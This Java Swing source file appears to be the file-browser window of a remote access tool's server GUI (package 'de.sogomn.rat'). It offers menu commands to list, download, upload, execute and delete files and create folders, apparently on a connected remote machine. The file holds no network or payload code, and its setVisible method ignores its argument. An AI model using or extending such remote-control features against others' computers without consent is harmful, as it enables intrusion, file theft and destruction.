package de.sogomn.rat.server.gui;

import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;
import java.io.File;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTree;
import javax.swing.tree.DefaultTreeModel;
import javax.swing.tree.TreePath;

import de.sogomn.engine.fx.SpriteSheet;
import de.sogomn.engine.util.AbstractListenerContainer;

public final class FileTree extends AbstractListenerContainer<IGuiController> {
	
	private JFrame frame;
	
	private FileTreeNode root;
	private JTree tree;
	private DefaultTreeModel treeModel;
	private JScrollPane scrollPane;
	
	private JPopupMenu menu;
	
	private FileTreeNode lastNodeClicked;
	
	private static final String ROOT_NAME = "";
	private static final Dimension DEFAULT_SIZE = new Dimension(500, 500);
	private static final BufferedImage[] MENU_ICONS = new SpriteSheet("/menu_icons_tree.png", 32, 32).getSprites();
	
	public static final String REQUEST = "Request content";
	public static final String DOWNLOAD = "Download file";
	public static final String UPLOAD = "Upload file here";
	public static final String EXECUTE = "Execute file";
	public static final String DELETE = "Delete file";
	public static final String NEW_FOLDER = "Create new folder here";
	
	public static final String[] COMMANDS = {
		REQUEST,
		DOWNLOAD,
		UPLOAD,
		EXECUTE,
		DELETE,
		NEW_FOLDER
	};
	
	public FileTree() {
		frame = new JFrame();
		root = new FileTreeNode(ROOT_NAME);
		tree = new JTree(root);
		treeModel = (DefaultTreeModel)tree.getModel();
		scrollPane = new JScrollPane(tree, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		menu = new JPopupMenu();
		
		for (int i = 0; i < COMMANDS.length && i < MENU_ICONS.length; i++) {
			final String command = COMMANDS[i];
			final ImageIcon icon = new ImageIcon(MENU_ICONS[i]);
			
			addMenuItem(command, icon);
		}
		
		final MouseAdapter mouseAdapter = new MouseAdapter() {
			@Override
			public void mousePressed(final MouseEvent m) {
				final int x = m.getX();
				final int y = m.getY();
				final TreePath path = tree.getPathForLocation(x, y);
				
				tree.setSelectionPath(path);
				
				if (path != null) {
					lastNodeClicked = (FileTreeNode)path.getLastPathComponent();
				} else {
					lastNodeClicked = null;
				}
			}
		};
		
		scrollPane.setBorder(null);
		tree.addMouseListener(mouseAdapter);
		tree.setEditable(false);
		tree.setComponentPopupMenu(menu);
		
		frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		frame.setPreferredSize(DEFAULT_SIZE);
		frame.setContentPane(scrollPane);
		frame.pack();
		frame.setLocationByPlatform(true);
	}
	
	private void addMenuItem(final String name, final Icon icon) {
		final JMenuItem item = new JMenuItem(name);
		
		item.setActionCommand(name);
		item.addActionListener(this::menuItemClicked);
		item.setIcon(icon);
		
		menu.add(item);
	}
	
	private void menuItemClicked(final ActionEvent a) {
		final String command = a.getActionCommand();
		
		notifyListeners(controller -> controller.userInput(command));
	}
	
	public void reload() {
		treeModel.reload();
	}
	
	public void addNodeStructure(final String... path) {
		FileTreeNode current = root;
		
		for (final String name : path) {
			final FileTreeNode next = current.getChild(name);
			
			if (next == null) {
				final FileTreeNode node = new FileTreeNode(name);
				
				treeModel.insertNodeInto(node, current, 0);
				
				current = node;
			} else {
				current = next;
			}
		}
	}
	
	public void addNodeStructure(final String path) {
		final String[] parts = path.split("\\" + File.separator);
		
		if (parts.length == 0) {
			final String[] part = {path};
			
			addNodeStructure(part);
		} else {
			addNodeStructure(parts);
		}
	}
	
	public void removeNode(final FileTreeNode node) {
		treeModel.removeNodeFromParent(node);
	}
	
	public void removeChildren(final FileTreeNode node) {
		final FileTreeNode[] children = node.getChildren();
		
		for (final FileTreeNode child : children) {
			treeModel.removeNodeFromParent(child);
		}
	}
	
	public void setVisible(final boolean visible) {
		frame.setVisible(true);
	}
	
	public void setTitle(final String title) {
		frame.setTitle(title);
	}
	
	public FileTreeNode getLastNodeClicked() {
		return lastNodeClicked;
	}
	
}
